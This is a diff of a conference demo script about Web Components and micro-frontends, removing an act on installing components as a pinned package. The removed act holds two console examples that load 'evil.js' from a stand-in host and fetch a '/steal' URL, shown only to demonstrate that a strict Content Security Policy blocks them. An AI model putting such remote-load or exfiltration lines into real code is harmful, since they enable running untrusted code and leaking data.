@@ -1,7 +1,7 @@
 # Demo script
 
-Three acts: write a Web Component by hand, let three frameworks use each other's components,
-then install those components as a package instead of loading them from a server.
+Two acts: write a Web Component by hand, then let three micro-frontends, each with its own
+framework and its own server, run together in three different shells.
 
 Start everything first with `docker compose up --build --watch`, and restore the seed data
 afterwards with `docker compose up -d --force-recreate mock-api`.
@@ -18,7 +18,7 @@ afterwards with `docker compose up -d --force-recreate mock-api`.
 **Message:** Web Components are a browser standard. No framework, no build. Attributes go in,
 events come out, and that is the whole contract.
 
-## Act 2: Frameworks calling each other
+## Act 2: Micro-frontends calling each other
 
 ### 2.1 Any framework hosts any other
 
@@ -62,39 +62,23 @@ Run `docker compose stop orders` and reload `http://localhost:4500/orders`.
 - Only the Orders card shows an error; the Vue and React parts keep working.
 - Run `docker compose start orders` and click Retry.
 
-**Message:** one team's outage never takes down the page. Each app deploys on its own.
+**Message:** one team's outage never takes down the page.
 
-## Act 3: A package instead of a server
+### 2.5 One release, every shell
 
-**Open** `http://localhost:4600` (`backoffice-vanilla`). Stop the Orders server again with
-`docker compose stop orders`.
+With `--watch` running, open
+`apps/microfrontends/orders/src/app/orders/components/orders-list/orders-list.html` and change the
+heading `Orders` to `Orders to ship`. Save, then reload `http://localhost:4200/orders`,
+`http://localhost:4400/orders` and `http://localhost:4500/orders`.
 
-- The same Angular list and detail on a page with **no framework**: open `app.js` and show
-  `querySelector`, `setAttribute`, `addEventListener`, exactly as in act 1.
-- DevTools, Network tab: every script comes from `localhost:4600`. The Angular code was installed
-  as `@shop/orders-elements`, and its hash is in `package-lock.json`.
-- In the console, try to reach another server:
+- All three shells show the new heading. None of them was rebuilt or restarted.
+- DevTools, Network tab: the Angular code comes from `localhost:4201`, the Orders team's server.
 
-  ```js
-  import('https://example.com/evil.js'); // blocked by script-src 'self'
-  fetch('https://example.com/steal');    // blocked by connect-src
-  ```
-
-**Then the same in a framework.** Restart `backoffice-react` with the Orders source switched
-from the remote server to the installed package, and open `http://localhost:4200/orders` with
-the Network tab open:
-
-- Remote: the Angular code comes from `localhost:4201` the first time `/orders` opens.
-- Package: the same code comes from `localhost:4200`, still only when `/orders` first opens.
-  It is lazy loaded from the app's own origin, and the Orders server can stay stopped.
-
-**Message:** runtime remotes give independent deployments; an installed package gives control.
-Nothing runs that you did not install and review.
+**Message:** each team deploys on its own; a new release reaches every page at the next load.
 
 ## Closing slide
 
 | Act | Takeaway |
 | --- | --- |
 | 1. Pure Web Components | A component is a class, a tag, attributes in and events out |
-| 2. Frameworks calling each other | Every framework can export and host custom elements; the host owns URL, layout and theme |
-| 3. A package instead of a server | Same components, but installed, reviewed and pinned, under a strict CSP |
+| 2. Micro-frontends calling each other | Every framework can export and host custom elements; each remote is a live service, and the host owns URL, layout and theme |
